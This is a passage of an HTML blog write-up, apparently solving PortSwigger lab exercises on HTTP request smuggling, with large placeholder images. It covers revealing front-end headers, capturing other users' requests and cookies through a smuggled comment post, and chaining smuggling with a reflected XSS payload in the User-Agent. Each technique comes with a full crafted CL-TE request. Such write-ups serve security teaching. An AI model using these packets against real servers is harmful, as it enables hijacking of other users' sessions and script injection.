src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520132406.png" alt=""></p><p>So we need to “hide” the request headers added by the Front server, we can use Smuggling to “hide” the request headers added by other Front servers, and then we can get the admin panel.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520135698.png" alt=""></p><p>The whole process looks relatively simple, but if you do it carefully, you will find the CL value is quite important. Let’s take a look at how the CL value of the packet requested by the Front is calculated:</p><p></p><figure class="highlight ocaml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span>\r\n--&gt;<span class="hljs-number">3</span> <span class="hljs-built_in">bytes</span></span><br><span class="line">\r\n--&gt; <span class="hljs-number">2</span> <span class="hljs-built_in">bytes</span></span><br><span class="line"><span class="hljs-type">POST</span> / <span class="hljs-type">HTTP</span>/<span class="hljs-number">1.1</span>\r\n--&gt;<span class="hljs-number">17</span> <span class="hljs-built_in">bytes</span></span><br><span class="line"><span class="hljs-type">Content</span>-<span class="hljs-type">Length</span>: <span class="hljs-number">70</span>\r\n--&gt;<span class="hljs-number">20</span> <span class="hljs-built_in">bytes</span></span><br><span class="line"><span class="hljs-type">Content</span>-<span class="hljs-type">Type</span>: application/x-www-form-urlencoded\r\n--&gt;<span class="hljs-number">49</span> <span class="hljs-built_in">bytes</span></span><br><span class="line">\r\n--&gt; <span class="hljs-number">2</span> <span class="hljs-built_in">bytes</span></span><br><span class="line">search=<span class="hljs-number">123</span>--&gt; <span class="hljs-number">10</span> <span class="hljs-built_in">bytes</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>There are 103 bytes in total. And the CL here may not be 70. Here, we only control how many bytes are leaked.</p><p>Another thing to note is that if you don’t add a Content-Type field, you need to add a CRLF at the end, otherwise it will return 400.</p><h3 id="Capturing-other-users’-requests"><a href="#Capturing-other-users’-requests" class="headerlink" title="Capturing other users’ requests"></a>Capturing other users’ requests</h3><p>Now that we can get middleware requests, of course, we can also try to get requests from other users, and also get cookies, etc. <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to capture other users’ requests</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding.</p><p>To solve the lab, smuggle a request to the back-end server that causes the next user’s request to be stored in the application. Then retrieve the next user’s request and use the victim user’s cookies to access their account.</p></blockquote><p>The principle is relatively simple. We can find a place to send a comment, and then use the comment to perform HTTP Smuggling. For example, we can construct the following request packet.</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac951f7d1e9ea625803c617f003f005c.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 271</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">POST /post/comment HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 600</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At</span><br><span class="line"></span><br><span class="line">csrf=oIjWmI8aLjIzqX18n5mNCnJieTnOVWPN&amp;postId=5&amp;name=1&amp;email=1%40qq.com&amp;website=http%3A%2F%2Fwww.baidu.com&amp;comment=1</span><br></pre></td></tr></tbody></table></figure><p></p><p>As long as the later CL is large enough, we can use HTTP Smuggling to stitch the next user’s request into our last comment parameter, and then we can see the request header of others when we look at the comment.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520138700.png" alt=""></p><h3 id="Exploit-Reflected-XSS"><a href="#Exploit-Reflected-XSS" class="headerlink" title="Exploit Reflected XSS"></a>Exploit Reflected XSS</h3><p>This usage scenario may be limited and rare, but if HTTP Smuggling &amp; reflected XSS exists, we can combinate two methods to leak others’ cookies.</p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding.</p><p>The application is also vulnerable to <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank" rel="noopener">reflected XSS</a> via the User-Agent header.</p><p>To solve the lab, smuggle a request to the back-end server that causes the next user’s request to receive a response containing an XSS exploit that executes alert(1).</p></blockquote><p>Still in the CL-TE, we can find a reflection XSS at the UA, but this is useless, so we have to find some way to upgrade the hazard.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520139474.png" alt=""></p><p>We can construct the following packets, just send them once.</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac811f011e27d43b80301693005a0007.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=iSxMvTrkiVN2G5N7EF7MTKgXGRE6A5xZ</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 150</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /post?postId=5 HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: "&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 5</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></tbody></table></figure><p></p><p>Then we casually visit any page on the site and it will <code>alert(1)</code> because our request is embedded in the second request above.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520132106.png" alt=""></p><p><img 